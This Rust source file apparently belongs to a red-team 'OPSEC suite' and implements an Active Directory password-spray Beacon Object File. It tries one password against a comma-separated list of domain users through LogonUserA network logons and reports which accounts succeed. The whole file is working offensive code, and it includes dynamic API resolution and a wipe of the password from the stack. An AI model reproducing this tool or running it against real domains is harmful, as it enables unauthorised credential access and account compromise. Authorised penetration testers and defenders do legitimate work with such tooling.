// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Active Directory password spray via LogonUserA (LOGON32_LOGON_NETWORK).
//!
//! Args: <domain> <password> <users_comma_separated>
//!   e.g.  CORP.LOCAL  Password123  user1,user2,user3
//!
//! IMPORTANT: operator must manage spray timing to avoid account lockout.
//!
//! MITRE ATT&CK: T1110.003 (Brute Force: Password Spraying)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1110.003",
        name: "Brute Force: Password Spraying",
        tactic: "Credential Access",
    },
];

const LOGON32_LOGON_NETWORK:      u32 = 3;
const LOGON32_PROVIDER_DEFAULT:   u32 = 0;
const INVALID_HANDLE_VALUE: isize = -1isize;

dfr_fn!(
    logon_user_a(
        lp_username: *const i8,
        lp_domain:   *const i8,
        lp_password: *const i8,
        dw_logon_type:     u32,
        dw_logon_provider: u32,
        ph_token:    *mut isize,
    ) -> i32,
    module = "advapi32.dll",
    api    = "LogonUserA"
);

dfr_fn!(
    close_handle(h_object: isize) -> i32,
    module = "kernel32.dll",
    api    = "CloseHandle"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let domain   = String::from(parser.get_str());
    let password = String::from(parser.get_str());
    let users    = String::from(parser.get_str());

    if domain.is_empty() || password.is_empty() || users.is_empty() {
        return Err("usage: password-spray-ad <domain> <password> <user1,user2,...>");
    }

    let mut domain_cstr = [0i8; 256];
    let mut pass_cstr   = [0i8; 256];
    for (i, b) in domain.bytes().enumerate()   { if i + 1 < domain_cstr.len() { domain_cstr[i] = b as i8; } }
    for (i, b) in password.bytes().enumerate() { if i + 1 < pass_cstr.len()   { pass_cstr[i]   = b as i8; } }

    let mut success_count: u32 = 0;
    let mut fail_count:    u32 = 0;

    // Iterate comma-separated usernames
    let mut start = 0usize;
    let user_bytes = users.as_bytes();
    loop {
        let end = user_bytes[start..].iter().position(|&b| b == b',')
            .map(|p| start + p)
            .unwrap_or(user_bytes.len());

        let user_slice = &user_bytes[start..end];
        if !user_slice.is_empty() {
            // Build NUL-terminated username on stack
            let mut user_cstr = [0i8; 128];
            for (i, &b) in user_slice.iter().enumerate() {
                if i + 1 < user_cstr.len() { user_cstr[i] = b as i8; }
            }

            let mut htoken: isize = 0;
            let ok = unsafe {
                logon_user_a(
                    user_cstr.as_ptr(),
                    domain_cstr.as_ptr(),
                    pass_cstr.as_ptr(),
                    LOGON32_LOGON_NETWORK,
                    LOGON32_PROVIDER_DEFAULT,
                    &mut htoken,
                )
            }.map_err(|_| "resolve failed")?;

            if ok != 0 {
                // Print success without leaking the password
                println!("[+] SUCCESS: {}\\{}", domain, core::str::from_utf8(user_slice).unwrap_or("?"));
                success_count += 1;
                if htoken != 0 && htoken != INVALID_HANDLE_VALUE {
                    let _ = unsafe { close_handle(htoken) };
                }
            } else {
                println!("[-] FAIL: {}\\{}", domain, core::str::from_utf8(user_slice).unwrap_or("?"));
                fail_count += 1;
            }
        }

        if end >= user_bytes.len() { break; }
        start = end + 1;
    }

    // Wipe password from stack
    for b in pass_cstr.iter_mut() { *b = 0; }

    println!("[*] spray complete — success: {}, fail: {}", success_count, fail_count);
    Ok(())
}
